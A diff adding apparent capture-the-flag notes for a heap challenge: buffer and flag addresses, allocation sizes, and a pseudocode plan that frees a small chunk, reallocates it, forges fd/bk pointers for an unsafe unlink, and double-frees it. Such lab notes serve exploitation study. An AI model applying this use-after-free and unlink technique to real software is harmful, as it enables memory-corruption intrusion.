@@ -1,0 +1,55 @@
+addr_big_secret   @ 0x6020a0
+flag_big_secret   @ 0x6030b8 (DWORD)
+
+addr_huge_secret  @ 0x6020a8
+flag_huge_secret  @ 0x6020bc (DWORD)
+
+addr_small_secret @ 0x6020b0
+flag_small_secret @ 0x6020c0 (DWORD)
+
+-- keep secret --
+
+sec_size_input_buf @ rbp-0x10 (DWORD)
+
+- small -
+addr_small_secret = calloc(0x28);
+read(1, addr_small_secret, 0x28);
+
+
+- big -
+addr_big_secret = calloc(0xfa0);
+
+- huge -
+addr_huge_secret = calloc(0x61a80)
+
+
+-- wipe --
+free
+undo flag
+
+
+-- renew --
+edit
+
+
+-- exploit --
+alloc small
+free small
+
+# this alloc should return the same address as the previous small
+alloc huge
+
+# make fake chunk for small
+small_chunk->fd = addr_small - 0x8 * 3
+small_chunk->bk = addr_small - 0x8 * 2
+
+# we can still free small here!
+# this will convince the malloc that the chunk is already freed
+free small
+
+alloc big
+
+
+
+Which size do i want to free with? small or big?
+SMALL!
